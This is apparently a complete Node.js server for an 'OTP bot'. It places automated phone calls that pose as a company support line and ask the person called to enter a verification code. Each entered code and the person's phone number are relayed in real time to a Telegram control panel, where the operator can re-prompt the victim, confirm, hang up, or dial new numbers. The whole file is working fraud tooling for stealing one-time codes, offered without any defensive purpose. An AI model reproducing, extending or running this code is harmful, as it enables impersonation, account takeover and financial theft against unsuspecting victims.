const express=require("express")
const bodyParser=require("body-parser")
const fetch=require("node-fetch")

const app=express()
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const PORT=process.env.PORT||3000

// ENV
const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID
const SW_PROJECT=process.env.SW_PROJECT
const SW_TOKEN=process.env.SW_TOKEN
const SW_SPACE=process.env.SW_SPACE
const SW_NUMBER=process.env.SW_NUMBER
const BASE_URL=process.env.BASE_URL

// SETTINGS
let settings={
company:"Support",
digits:6,
assistant:0
}

const assistants=[
"Polly.Joanna",
"Polly.Amy",
"Polly.Brian",
"Polly.Matthew",
"Polly.Ivy",
"Polly.Justin"
]

// STATE
let activeCallSid=null
let activeCaller=null
let activeCode=null
let callStart=null
let lastCaller=null
let panelMessageId=null

let logs=[]

// TELEGRAM
async function tg(method,data){
return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify(data)
}).then(r=>r.json())
}

async function tgSend(text,buttons=null){

const body={chat_id:CHAT_ID,text}

if(buttons){
body.reply_markup={inline_keyboard:buttons}
}

return tg("sendMessage",body)
}

// PANEL TEXT
function panelText(){

let duration="0s"

if(callStart){
duration=Math.floor((Date.now()-callStart)/1000)+"s"
}

return `📞 IVR CONTROL PANEL

Caller: ${activeCaller||"None"}
Code: ${activeCode||"Waiting"}
Duration: ${duration}

Company: ${settings.company}
Digits: ${settings.digits}
Voice: ${settings.assistant+1}`
}

// PANEL BUTTONS
function panelButtons(){
return[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Ask Again",callback_data:"again"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{text:"📞 Start Call",callback_data:"call"},
{text:"☎ Call Last",callback_data:"calllast"}
],
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
]
]
}

// PANEL UPDATE
async function updatePanel(){

if(!panelMessageId){

const msg=await tgSend(panelText(),panelButtons())

panelMessageId=msg.result.message_id
return
}

try{

await tg("editMessageText",{
chat_id:CHAT_ID,
message_id:panelMessageId,
text:panelText(),
reply_markup:{inline_keyboard:panelButtons()}
})

}catch{}
}

// ROOT
app.get("/",(req,res)=>{
res.send("Server running")
})

// IVR
app.post("/ivr",(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From
const sid=req.body.CallSid

// ASK CODE
if(!digits){

res.type("text/xml")
return res.send(`
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr">
<Say voice="${assistants[settings.assistant]}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
</Gather>
<Redirect>${BASE_URL}/ivr</Redirect>
</Response>
`)
}

// SAVE
activeCallSid=sid
activeCaller=caller
activeCode=digits
lastCaller=caller
callStart=callStart||Date.now()

logs.unshift(`${caller} : ${digits}`)
logs=logs.slice(0,10)

// FAST RESPONSE FIRST
res.type("text/xml")
res.send(`
<Response>
<Say voice="${assistants[settings.assistant]}">
Thank you. Your code has been received.
</Say>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)

// TELEGRAM AFTER
setTimeout(async()=>{

try{

await tgSend(`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`)

updatePanel()

}catch{}

},0)

})

// HOLD
app.post("/hold",(req,res)=>{

res.type("text/xml")
res.send(`
<Response>
<Pause length="10"/>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)
})

// TELEGRAM
app.post("/telegram",async(req,res)=>{

const msg=req.body.message
const callback=req.body.callback_query

// COMMANDS
if(msg){

const text=msg.text

if(text==="/panel"||text==="/menu"){
panelMessageId=null
updatePanel()
}

if(text==="/status"){
updatePanel()
}

if(text==="/logs"){

let text="📜 Logs\n\n"

logs.forEach(l=>{
text+=l+"\n"
})

tgSend(text)

}

if(text.startsWith("/call ")){

const number=text.split(" ")[1]

await startCall(number)

}

if(text==="/calllast"){
await startCall(lastCaller)
}

}

// BUTTONS
if(callback){

const action=callback.data

if(action==="confirm"){
await endCall()
tgSend("✔ Confirmed")
}

if(action==="again"){
await replayIVR()
}

if(action==="hangup"){
await endCall()
}

if(action==="call"){
tgSend("Send number to call")
}

if(action==="calllast"){
await startCall(lastCaller)
}

if(action==="status"){
updatePanel()
}

if(action==="logs"){

let text="📜 Logs\n\n"

logs.forEach(l=>{
text+=l+"\n"
})

tgSend(text)

}

}

res.sendStatus(200)

})

// OUTBOUND CALL
async function startCall(number){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
method:"POST",
headers:{
Authorization:"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
From:SW_NUMBER,
To:number,
Url:`${BASE_URL}/ivr`
})
})

}

// END CALL
async function endCall(){

if(!activeCallSid)return

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({Status:"completed"})
})

activeCallSid=null
activeCode=null
callStart=null
updatePanel()
}

// REPLAY IVR
async function replayIVR(){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({Url:`${BASE_URL}/ivr`})
})

}

// PANEL TIMER
setInterval(updatePanel,2000)

app.listen(PORT,()=>{
console.log("Server running")
})
